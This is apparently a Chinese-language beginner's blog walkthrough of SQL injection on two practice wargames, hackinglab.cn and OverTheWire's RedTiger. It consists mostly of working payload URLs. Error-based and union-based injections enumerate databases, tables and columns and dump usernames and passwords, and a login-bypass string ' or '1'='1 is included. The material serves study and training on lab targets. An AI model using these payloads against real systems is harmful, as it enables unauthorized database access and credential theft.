---
title: sql注入入门
date: 2017-08-06 10:08:25
tags:
- sql注入
- web安全
category:
- web安全
- sql
- sql注入
---

本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...

<!-- more -->

# 练习网站

[网络信息安全攻防学习平台](http://hackinglab.cn/index.php)

//看数据库版本 5.1.73
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//看当前用户 saeuser@220.181.129.121
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//当前数据库 mydbs
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆库 information_schema, mydbs, test
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆表 log, motto, user
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆字段 id, username, password
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23

http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//读内容
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1)))%23
```
//发现user表没有flag，读motto表
key#notfound!#




# [RegTiger](http://redtiger.labs.overthewire.org)

## level1

点击Category：1后，网址以GET方式传递`cat`参数。
### 利用`and 1=1`,`and 1=2`进行判断是否存在注入点：
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2 
```
### 存在数字型注入，利用order by 测试出存在4个列： 
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5 
```

### 构造union联合查询语句，找回显： 
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 
```
发现3,4 处存在回显。

我这里继续爆库、爆表、爆字段等操作，发现异常。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()
```
回显

		5.5.57-0+deb8u1
		hackit
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='level1_users'
```
回显

		Some things are disabled!!!

所以无法找出`level1_users`的字段了吗？
当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为
	
	查询字符串
		cat:1
	表单数据
		user:
		password:
		login:login

开始试了试
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users
```
结果不对，而我观察到页面中给出的是`username`，所以换成它。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_us

```
got it.拿到用户名密码后登录即可。

## level2

绕过的sql万能密码：
```
' or '1'='1
```

## 参考网站
[1] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)